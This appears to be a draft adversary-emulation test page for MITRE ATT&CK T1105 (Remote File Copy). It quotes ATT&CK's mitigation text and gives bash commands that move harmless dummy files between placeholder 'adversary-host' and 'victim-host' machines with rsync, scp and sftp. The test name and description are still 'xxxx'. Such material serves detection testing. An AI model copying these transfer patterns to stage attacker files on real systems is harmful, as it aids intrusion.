# T1105 - Remote File Copy Mitigation
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1105)
>>> Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)

## Atomic Test #1 - xxxx
xxxx

**Supported Platforms:** linux, macos


#### Run it with `bash`!
```
### TODO: Not sure how to handle commands that need to be run on multiple systems

# Adversary System Configuration
# Ensure SSH access has been configured for an adversary account
echo "This file transferred by scp" > /tmp/adversary-scp
echo "This file transferred by sftp" > /tmp/adversary-sftp
mkdir /tmp/adversary-rsync
cd /tmp/adversary-rsync
touch a b c d e f g

# Victim System Configuration
# Ensure SSH access has been configured for a victim account
# Ensure write access for victim account to this directory
mkdir /tmp/victim-files
cd /tmp/victim-files

# Push files to victim using rsync
rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/

# Pull files from adversary using rsync
rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/

# Push files to victim using scp
scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/

# Pull file from adversary using scp
scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file

# Push files to victim using sftp
sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'

# Pull file from adversary using sftp
sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
